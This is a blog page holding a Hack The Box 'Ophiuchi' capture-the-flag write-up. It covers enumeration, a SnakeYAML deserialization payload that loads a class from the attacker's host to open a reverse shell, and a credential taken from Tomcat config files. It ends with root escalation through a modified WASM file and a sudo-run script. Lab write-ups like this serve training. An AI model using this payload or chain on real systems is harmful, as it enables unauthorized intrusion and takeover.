@@ -1,0 +1,571 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Ophiuchi &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Ophiuchi - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Ophiuchi">
+    <meta itemprop="description" content="Hack The Box - Ophiuchi - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Ophiuchi">
+    <meta property="og:description" content="Hack The Box - Ophiuchi - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/article/ophiuchi/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/article/ophiuchi/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/article/ophiuchi/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/" class="active">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/article/ophiuchi/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/article/ophiuchi/">
+            Hack The Box - Ophiuchi
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-07-08</span>
+            
+        
+
+        
+            
+                <span class="readingTime">5 min read</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/linux/">linux</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/ophiuchi/oph-fiche.png" alt=""></p>
+<p>Ophiuchi is a medium <a href="https://app.hackthebox.eu/machines/Ophiuchi">machine</a> that was deployed on Hack The Box on Saturday, 13 january 2021 and created by <strong>felamos</strong>.</p>
+<h1 id="quick-summary">Quick summary</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+        <li><a href="#web-enumeration">Web enumeration</a></li>
+        <li><a href="#foothold---tomcat">Foothold - tomcat</a></li>
+        <li><a href="#lateral-movement---admin">Lateral movement - admin</a></li>
+        <li><a href="#privesc---root">PrivEsc - root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap-scan">Nmap scan</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>There is :</p>
+<ul>
+<li>an <code>SSH</code> service on port <code>22/TCP</code></li>
+<li>a <code>HTTP/Apache Tomcat</code> service on port <code>8080/TCP</code></li>
+<li>Linux OS</li>
+</ul>
+<h3 id="web-enumeration">Web enumeration</h3>
+<p>When we go on the website under port <code>8080</code>, we come across a <a href="https://fr.wikipedia.org/wiki/YAML">YAML</a> parser.</p>
+<p><img src="/img/ophiuchi/oph-site.png" alt=""></p>
+<p>If I try to put <code>test</code> and click <code>PARSE</code>, I get a return that indicates that for security reasons, the feature has been temporarily disabled.</p>
+<p><img src="/img/ophiuchi/oph-reason.png" alt=""></p>
+<p>An analysis with gobuster reveals the presence of the following directories</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luks@kali:~/infosec/htb/actives/ophiuchi$ gobuster dir -u http://ophiuchi.htb:8080 -w /usr/share/wordlists/dirb/common.txt 
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://ophiuchi.htb:8080
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+<span style="color:#f92672">===============================================================</span>
+2021/06/26 16:09:54 Starting gobuster in directory enumeration mode
+<span style="color:#f92672">===============================================================</span>
+/host-manager         <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /host-manager/<span style="color:#f92672">]</span>
+/manager              <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /manager/<span style="color:#f92672">]</span>     
+/Servlet              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                     
+/test                 <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /test/<span style="color:#f92672">]</span>        
+                                                                  
+<span style="color:#f92672">===============================================================</span>
+2021/06/26 16:10:03 Finished
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><ul>
+<li><code>/host-manager</code> -&gt; accessible with authentication</li>
+<li><code>/manager</code> -&gt; accessible with authentication</li>
+<li><code>/test</code> -&gt; 404 not found</li>
+<li><code>/Servlet</code> -&gt; 404 not found</li>
+</ul>
+<p>When trying the <a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">default credentials</a> of the Tomcat application, I can&rsquo;t connect.</p>
+<p>Searching for <code>yaml parser exploit</code> on Google, I come across the <a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">blog</a> of <code>Swapneil Kumar Dash</code> who explains us the deserialization vulnerability exploitation of <code>SnakeYaml</code>.</p>
+<p>The vulnerable application has a feature that allows us to download a Yaml file from the web interface and parse it on the server side using the snakeyaml library. If we find the <code>yaml.load</code> function with a user input passed directly to the function then the application is vulnerable to deserialization which allows us to obtain an RCE.</p>
+<h3 id="foothold---tomcat">Foothold - tomcat</h3>
+<p>For the foothold, I clone the <a href="https://github.com/artsploit/yaml-payload">repo</a> of the payload and under <code>yaml-payload/src/artsploit</code> I modify the <code>AwesomeScriptEngineFactory.java</code> file to put a <a href="https://github.com/welk1n/ReverseShell-Java">reverse shell Java</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luks@kali:~/infosec/htb/actives/ophiuchi$ git clone https://github.com/artsploit/yaml-payload
+Cloning into <span style="color:#e6db74">&#39;yaml-payload&#39;</span>...
+remote: Enumerating objects: 10, <span style="color:#66d9ef">done</span>.
+remote: Total <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">10</span>
+Unpacking objects: 100% <span style="color:#f92672">(</span>10/10<span style="color:#f92672">)</span>, 1.34 KiB | 1.34 MiB/s, <span style="color:#66d9ef">done</span>. 
+luks@kali:~/infosec/htb/actives/ophiuchi$ cd yaml-payload/src/artsploit/
+luks@kali:~/infosec/htb/actives/ophiuchi/yaml-payload/src/artsploit$ ll
+total <span style="color:#ae81ff">4</span>
+-rw-r--r-- <span style="color:#ae81ff">1</span> luks luks <span style="color:#ae81ff">1589</span> Jun <span style="color:#ae81ff">26</span> 20:35 AwesomeScriptEngineFactory.java
+</code></pre></div><p><img src="/img/ophiuchi/oph-java.png" alt=""></p>
+<p>Compiling, opening a python web server and a netcat listener on port  <code>1337</code></p>
+<p><img src="/img/ophiuchi/oph-foot.png" alt=""></p>
+<p>I add the payload to the Yaml parser and click on parse to get a reverse shell as <code>tomcat</code>.</p>
+<p>Payload :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [  
+    <span style="color:#75715e">!!java.net.URLClassLoader</span> [[  
+        <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://10.10.14.x/&#34;</span>]  
+    ]]  
+ ]<span style="color:#ae81ff">`</span>
+</code></pre></div><p><img src="/img/ophiuchi/oph-rev.png" alt=""></p>
+<h3 id="lateral-movement---admin">Lateral movement - admin</h3>
+<p>Displaying the users with the command <code>/etc/passwd</code>, I find the <code>admin</code> and <code>tomcat</code> with its directory <code>/opt/tomcat</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@ophiuchi:/$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:1001:1001::/opt/tomcat:/bin/false
+admin:x:1000:1000:,,,:/home/admin:/bin/bash
+</code></pre></div><p>After investigation, I find a <code>/conf</code> folder in the <code>tomcat</code> directory. By displaying interesting files like <code>tomcat-users.*</code> with a grep on <code>password</code>, I find the password of the user admin.</p>
+<p><code>admin:whythereisalimit</code></p>
+<p><img src="/img/ophiuchi/oph-conf.png" alt=""></p>
+<p>As an SSH port is open on the machine, I try to connect and it works.</p>
+<p><img src="/img/ophiuchi/oph-adm.png" alt=""></p>
+<p>I can retrieve the first flag <code>user.txt</code>. 😊</p>
+<p><img src="/img/ophiuchi/oph-user.png" alt=""></p>
+<h3 id="privesc---root">PrivEsc - root</h3>
+<p>When I enter the <code>sudo -l</code> command, I find the following file that can be executed with <code>root</code> privileges.</p>
+<p><img src="/img/ophiuchi/oph-sudo.png" alt=""></p>
+<p>This is a Go language file that checks the value of the <code>f</code> variable in the <code>main.wasm</code> file, if it is equal to <code>1</code> then we can use the <code>deploy.sh</code> script.</p>
+<p><img src="/img/ophiuchi/oph-main.png" alt=""></p>
+<p>After using <code>scp</code> and <code>python</code>, I was unable to retrieve the file on my machine. So I&rsquo;m going to use <code>cat</code> and <code>netcat</code> to redirect the contents of a file across the network as explained <a href="https://doc.fedora-fr.org/wiki/Netcat,_connexion_client/serveur_en_bash">here</a>. I start by opening a listener on port <code>4444</code>.</p>
+<p><img src="/img/ophiuchi/oph-list.png" alt=""></p>
+<p>Then the <code>cat</code> command to send the contents of the file.</p>
+<p><img src="/img/ophiuchi/oph-cat.png" alt=""></p>
+<p>We have recovered the <code>main.wasm</code> on our kali.</p>
+<p><img src="/img/ophiuchi/oph-bin.png" alt=""></p>
+<p><a href="https://fr.wikipedia.org/wiki/WebAssembly">WASM</a> is a World Wide Web standard for application development. It is designed to complement JavaScript with superior perfomance. While searching <code>wasm convert bin to text</code>, I come across this <a href="https://github.com/WebAssembly/wabt">link</a> which is suite of tools for <code>WebAssembly</code>.</p>
+<p>Going down, we find <code>Online Demos</code> with the possibility to import our binary to be able to covert it into text format. We can see that the function is defined on <code>0</code>.</p>
+<p><img src="/img/ophiuchi/oph-wat.png" alt=""></p>
+<p>I replace with <code>1</code> and copy the contents of the file to the other tool to convert it back to binary format.</p>
+<p><img src="/img/ophiuchi/oph-1.png" alt=""></p>
+<p>I click on download to get the file.</p>
+<p><img src="/img/ophiuchi/oph-wasm.png" alt=""></p>
+<p>Rename the download file to <code>main.wasm</code> and do the same thing to transfer it to the target this time.</p>
+<p><img src="/img/ophiuchi/oph-tar.png" alt=""></p>
+<p>I move the file on the <code>/tmp</code> (write) directory and create the <code>deploy.sh</code> script. We give it to the rights and run the command <code>sudo -u root /usr/bin/go run /opt/wasm-functions/index.go</code>. To finish we run the <code>/bin/bash -p</code> command to become root and get the last  flag. 🥳</p>
+<p><img src="/img/ophiuchi/oph-root.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/web/">web</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/java/">java</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/deserialisation/">deserialisation</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/golang/">golang</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/source-code-review/">source code review</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/fr/article/ophiuchi/">fr</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Latest posts</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/advuln/">Setting up a vulnerable AD environment</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/categories/"><strong>Categories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/categories/ctf">Ctf
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/htb">Htb
+                        (21)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/write-up">Write up
+                        (18)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/linux">Linux
+                        (15)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/writeup">Writeup
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Social media</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Other languages</strong>
+                
+                
+                <a href="//luksec.fr/" class="active">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
